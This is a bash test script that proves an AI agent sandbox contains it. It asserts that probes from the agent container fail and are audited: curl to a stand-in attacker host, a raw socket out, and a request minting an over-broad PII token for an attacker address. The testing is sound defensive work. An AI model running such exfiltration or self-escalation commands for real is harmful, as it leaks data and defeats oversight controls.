#!/usr/bin/env bash
# Proves the containment claim. This is the answer to the first question you
# will be asked, and it is worth being able to run it live.
set -uo pipefail

rm -f data/audit.jsonl        # else the final grep can pass on a stale record

# The broker refuses to start without the public half of the keypair, and it
# never holds the private half. Generate both outside the containers, exactly
# as scripts/demo.sh does.
mkdir -p data
[ -f data/agent.key ] || { openssl genpkey -algorithm ed25519 -out data/agent.key; chmod 600 data/agent.key; }
openssl pkey -in data/agent.key -pubout -out data/agent.pub

docker compose -f compose.yml -f demo/compose.demo.yml --profile protected up -d opa docstore mailer sinkhole broker broker-control
sleep 3

fail=0

# LIVENESS FIRST, and it is not a formality. Every check below asserts that
# something FAILS, so "ok: minting via broker-control:8081 was blocked" prints
# identically whether the network boundary held or the service never started —
# and this script is the only CI job that boots broker-control at all. B7 gave
# that service two new ways to die at boot: control.toml's [audit] section is
# mandatory now, and build() opens the audit log. Without this, a control plane
# that cannot start would turn the containment proof green.
#
# From the HOST, not from agent-runtime: broker-control publishes 8081 to the
# host precisely because agent-net has no route to it, which is the property
# the checks below are about.
if curl -sf --max-time 5 -X POST http://127.0.0.1:8081/v1/tokens \
     -H 'content-type: application/json' \
     -d '{"agent_id":"probe","task_id":"0000","purpose":"liveness","allowed_tools":[],"data_classes":[],"counterparties":[]}' \
     >/dev/null 2>&1; then
  echo "ok:   broker-control is up and minting (so a blocked mint below means the network, not a dead service)"
else
  echo "FAIL: broker-control did not mint from the host — every 'was blocked' result below is meaningless"
  fail=1
fi

# And the mint it just did must be IN THE BROKER'S LOG. Two containers, two
# [audit].path strings that nothing in the product compares, one bind mount:
# this is the only check anywhere that they actually resolve to the same file.
# It is also the cheapest real-Docker version of the two-writer interleave
# test — the control plane wrote a record into a chain the broker is also
# writing to, and the CONNECT grep below reads the same file afterwards.
if grep -q '"type": *"mint"' data/audit.jsonl 2>/dev/null; then
  echo "ok:   the mint was recorded in the broker's own audit log"
else
  echo "FAIL: broker-control minted but wrote no record the broker's log can see"
  fail=1
fi

# curl -f is required: with the proxy reachable, a denied request returns an
# HTTP error page rather than failing to connect, and plain `curl` would exit 0.
check() {  # name, expected-to-fail command
  if docker compose -f compose.yml -f demo/compose.demo.yml --profile protected run --rm --entrypoint sh agent-runtime -c "$2" >/dev/null 2>&1; then
    echo "FAIL: $1 succeeded but must not have"
    fail=1
  else
    echo "ok:   $1 was blocked"
  fi
}

check "direct curl to the internet"   "curl -sf --max-time 5 https://example.com"
check "curl to the sinkhole"          "curl -sf --max-time 5 http://attacker.example/collect"
check "curl straight to the docstore" "curl -sf --max-time 5 http://docstore.internal/docs/ticket-4711"
check "raw socket to 1.1.1.1:53"      "python -c \"import socket;socket.create_connection(('1.1.1.1',53),timeout=5)\""

# Privilege escalation, not just exfiltration. The minting endpoint has no
# caller authentication, so "the agent cannot mint itself a broader token"
# rests entirely on there being no route to it. Probe both the service that
# serves it (backend-net only) and the port it used to be co-hosted on inside
# the broker itself (agent-net) — the second is the regression check.
MINT_BODY='{"agent_id":"x","task_id":"9999","purpose":"support-triage","allowed_tools":["read_document","query_customers","http_fetch","send_email"],"data_classes":["pii"],"counterparties":["attacker@evil.example"]}'
check "minting via broker-control:8081" \
  "curl -sf --max-time 5 -X POST http://broker-control:8081/v1/tokens -H 'content-type: application/json' -d '$MINT_BODY'"
check "minting via broker:8081"         \
  "curl -sf --max-time 5 -X POST http://broker:8081/v1/tokens -H 'content-type: application/json' -d '$MINT_BODY'"

if docker compose -f compose.yml -f demo/compose.demo.yml --profile protected run --rm --entrypoint sh agent-runtime \
     -c "curl -s --max-time 5 http://broker:8080/docs" >/dev/null 2>&1; then
  echo "ok:   the broker is reachable"
else
  echo "FAIL: the broker should be reachable"
  fail=1
fi

# Blocking is only half the job. A refusal that leaves no trace makes a probe
# look like it never happened, so assert the attempt was RECORDED too.
if grep -q '"tool": *"CONNECT"' data/audit.jsonl 2>/dev/null; then
  echo "ok:   the bypass attempt was recorded in the audit log"
else
  echo "FAIL: bypass attempts were blocked but left no audit record"
  fail=1
fi

exit $fail
